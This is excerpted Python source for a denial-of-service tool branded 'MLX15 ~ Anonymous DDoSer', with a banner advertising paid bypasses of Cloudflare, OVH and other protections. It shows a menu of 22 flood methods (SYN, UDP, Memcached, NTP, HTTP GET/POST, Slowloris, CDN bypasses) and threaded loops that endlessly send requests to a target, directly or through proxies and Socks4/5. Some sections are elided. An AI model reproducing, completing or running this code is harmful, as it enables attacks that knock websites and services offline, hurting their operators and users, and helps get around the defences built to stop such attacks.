...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title MLX15 ~ Anonymous DDoSer ")
    print('''
             - MLX15 Selling Bypass CF/OVH/UAM/NFO/etc -
...
def start_mode():
    ...
    print("""
[+]=====[ Layer 4 ]=========[+]===============[ Layer 7 ]===================[+]
 # 1: TCP Flood Bypass	     # 9: GET Flood        # 18: EVEN FLOOD
 # 1: UDP Flood Bypass       # 10: POST Flood      # 19: GSB Bypass
 # 2: SYN Flood      	     # 11: OVH Bypass      # 20: DGB Guard Bypass                  
 # 3: VSE Flood  	     # 12: CF Bypass       # 21: AVB Arvan Cloud             
 # 4: Memcached Flood        # 13: NFO Bypass      # 22: BNA NORMAL ANTI              
 # 5: NSP-DDos               # 14: DYN Request   
 # 6: NTP Flood              # 15: SLOWLORIS	    
 # 7: HTTP-Sock              # 16: BRUST    
 # 8: Flood ICMP Request     # 17: PPS HTTP
[+]=================================================[+]
""")
    choice_mode = input("[*] Attack Mode [1-22]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] MLX15-Attack | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[!] MLX15-Attack | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[!] MLX15-Attack | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] MLX15-Attack | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] MLX15-Attack | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] MLX15-Attack | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] MLX15-Attack | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] MLX15-Attack | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
